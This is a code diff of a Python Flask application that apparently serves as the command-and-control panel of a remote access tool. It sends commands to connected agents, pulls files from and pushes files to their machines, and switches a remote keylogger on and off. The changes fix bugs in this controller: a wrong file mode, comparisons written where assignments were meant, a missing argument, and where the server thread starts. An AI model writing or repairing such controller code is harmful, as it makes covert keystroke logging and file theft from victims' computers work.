@@ -35,7 +35,7 @@ def handle_connection(connection, address, thread_index):
                     cmd = CMD_INPUT[thread_index]
                     connection.send(cmd.encode())
                     contents = connection.recv(1024*10000)
-                    f = open(filename,'rb')
+                    f = open(filename,'wb')
                     f.write(contents)
                     f.close()
                     CMD_OUTPUT[thread_index] = "File Downloaded Successfully"
@@ -53,10 +53,10 @@ def handle_connection(connection, address, thread_index):
                     msg = connection.recv(2048).decode()
                     if msg == 'received file':
                         CMD_OUTPUT[thread_index] = 'File Sent Successfully'
-                        CMD_INPUT[thread_index]!= ''
+                        CMD_INPUT[thread_index] = ''
                     else:
                         CMD_OUTPUT[thread_index] = 'Some Error Occurred'
-                        CMD_INPUT[thread_index]!= ''
+                        CMD_INPUT[thread_index] = ''
                 
                 
                 elif CMD_INPUT[thread_index] == 'keylog on':
@@ -64,14 +64,14 @@ def handle_connection(connection, address, thread_index):
                     connection.send(cmd.encode())
                     msg = connection.recv(2048).decode()
                     CMD_OUTPUT[thread_index]=msg
-                    CMD_INPUT[thread_index]!= ''
-                
+                    CMD_INPUT[thread_index] = ''
+
                 elif CMD_INPUT[thread_index] == 'keylog off':
                     cmd = CMD_INPUT[thread_index]
                     connection.send(cmd.encode())
                     msg = connection.recv(2048).decode()
                     CMD_OUTPUT[thread_index]=msg
-                    CMD_INPUT[thread_index]!= ''
+                    CMD_INPUT[thread_index] = ''
 
                 
                 else:
@@ -79,7 +79,7 @@ def handle_connection(connection, address, thread_index):
                     connection.send(msg.encode())
                     CMD_INPUT[thread_index] = ''
                     break
-    close_connection(connection)
+    close_connection(connection, thread_index)
 
 def close_connection(connection,thread_index):
     connection.close()
@@ -101,11 +101,6 @@ def server_socket():
         THREADS.append(t)
         IP.append(address)
         t.start()
-
-@app.before_request
-def init_server():
-    s1 = threading.Thread(target=server_socket)
-    s1.start()
 
 @app.route("/")
 def root():
@@ -136,4 +131,6 @@ def execute(agentname):
         return render_template('execute.html',cmdoutput=cmdoutput,name=agentname)
 
 if __name__ == '__main__':
+    s1 = threading.Thread(target=server_socket)
+    s1.start()
     app.run(debug=True)
